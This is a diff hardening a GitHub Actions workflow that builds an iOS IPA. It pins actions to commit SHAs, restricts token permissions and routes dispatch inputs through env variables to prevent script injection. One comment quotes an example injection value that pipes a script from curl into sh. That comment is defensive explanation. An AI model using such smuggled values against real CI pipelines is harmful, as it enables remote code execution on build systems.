@@ -27,6 +27,9 @@ on:
 jobs:
   build:
     runs-on: macos-latest
+    # Least privilege: nothing here writes to the repo via the job token.
+    permissions:
+      contents: read
     timeout-minutes: 60
 
     defaults:
@@ -35,10 +38,10 @@ jobs:
 
     steps:
       - name: Checkout
-        uses: actions/checkout@v4
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
 
       - name: Setup Node.js
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020  # v4.4.0
         with:
           node-version: '24'
 
@@ -47,11 +50,16 @@ jobs:
 
       # ── Capacitor ────────────────────────────────────────────────────────────
       - name: Inject configuration
+        env:
+          # Via env, not ${{ }} inline: a dispatch input substituted straight into the
+          # run script is shell source, so a value like `"; curl evil.sh | sh; #` executes.
+          BUNDLE_ID_INPUT: ${{ github.event.inputs.bundle_id }}
+          SERVER_URL_INPUT: ${{ github.event.inputs.server_url }}
         run: |
-          BUNDLE_ID="${{ github.event.inputs.bundle_id }}"
+          BUNDLE_ID="$BUNDLE_ID_INPUT"
           sed -i '' "s/REPLACE_WITH_YOUR_BUNDLE_ID/$BUNDLE_ID/" capacitor.config.json
           echo "Bundle ID: $BUNDLE_ID"
-          SERVER_URL="${{ github.event.inputs.server_url }}"
+          SERVER_URL="$SERVER_URL_INPUT"
           if [ -n "$SERVER_URL" ]; then
             python3 -c "import json,sys;p='capacitor.config.json';d=json.loads(open(p).read());d.setdefault('server',{})['url']=sys.argv[1];open(p,'w').write(json.dumps(d,indent=2));print('Server URL:',sys.argv[1])" "$SERVER_URL"
           else
@@ -225,7 +233,7 @@ jobs:
           echo "IPA size: $(du -sh Codexa-sideload.ipa | cut -f1)"
 
       - name: Upload IPA artifact
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02  # v4.6.2
         with:
           name: Codexa-sideload-${{ github.run_number }}
           path: iOS/build/Codexa-sideload.ipa
